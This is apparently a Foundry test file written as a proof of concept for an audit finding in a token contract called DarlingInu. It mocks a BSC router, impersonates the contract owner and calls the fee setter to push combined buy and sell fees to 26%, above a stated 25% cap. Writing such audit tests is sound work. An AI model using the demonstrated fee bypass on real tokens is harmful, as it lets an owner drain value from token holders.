// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/DarlingInu.sol";

contract MockFactory {
    address public immutable pairAddress;
    
    constructor(address _pairAddress) {
        pairAddress = _pairAddress;
    }
    
    function createPair(address, address) external view returns (address) {
        return pairAddress;
    }
}

contract MockWETH {}

contract FeeManipulationTest is Test {
    DarlingInu token;
    // Fixed addresses
    address constant FIXED_OWNER = 0x8c919e9F79686c6D5E6336B558349E13B864D621;
    address constant BSC_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint constant FEE_THRESHOLD = 25;

    function setUp() public {
        // Create a dummy pair address and mock dependencies
        address dummyPair = address(0xABCD);
        MockWETH mockWETH = new MockWETH();
        MockFactory mockFactory = new MockFactory(dummyPair);

        // Mock router calls for token deployment
        vm.mockCall(
            BSC_ROUTER,
            abi.encodeWithSignature("factory()"),
            abi.encode(address(mockFactory))
        );
        vm.mockCall(
            BSC_ROUTER,
            abi.encodeWithSignature("WETH()"),
            abi.encode(address(mockWETH))
        );

        // Deploy token after setting up mocks
        token = new DarlingInu();
        
        // Fund owner for gas
        vm.deal(FIXED_OWNER, 100 ether);
    }

    function test_CanSetFeesAbove25Percent() public {
        // Pre-trigger state capture
        (uint256 buyFeeBefore, uint256 sellFeeBefore) = _getFeeState();

        console.log("--- BEFORE-Trigger Fees ---");
        console.log("Buy Fee Before:", buyFeeBefore);
        console.log("Sell Fee Before:", sellFeeBefore);
        console.log("Total Fee Before:", buyFeeBefore + sellFeeBefore);

        // Trigger vulnerability
        console.log("--- Trigger SetFees(13,13) ---");
        vm.startPrank(FIXED_OWNER);
        token._set_Fees(13, 13);
        vm.stopPrank();

        // Post-trigger state capture
        (uint256 buyFeeAfter, uint256 sellFeeAfter) = _getFeeState();

        console.log("--- AFTER-Trigger Fees ---");
        console.log("Buy Fee After:", buyFeeAfter);
        console.log("Sell Fee After:", sellFeeAfter);
        console.log("Total Fee After:", buyFeeAfter + sellFeeAfter);

        // Compare states
        bool feesChanged = (buyFeeAfter != buyFeeBefore) || (sellFeeAfter != sellFeeBefore);
        bool bothSetTo13 = (buyFeeAfter == 13) && (sellFeeAfter == 13);
        bool totalAboveThreshold = (buyFeeAfter + sellFeeAfter) > FEE_THRESHOLD;

        console.log("Fees changed after attack?", feesChanged ? "YES" : "NO");
        console.log("Fees were set to 13%?", bothSetTo13 ? "YES" : "NO");
        console.log("Total fees above 25%?", totalAboveThreshold ? "YES" : "NO");

        // Final verdict
        if (bothSetTo13 && totalAboveThreshold) {
            console.log("Vulnerability Exists: Successfully set buy/sell fees to 13% each (26% total) exceeding 25% limit");
        } else {
            console.log("Vulnerability not Exist: Failed to set fees above 25% limit");
        }
    }

    function _getFeeState() internal view returns (uint256, uint256) {
        return (token._buyFee(), token._sellFee());
    }
}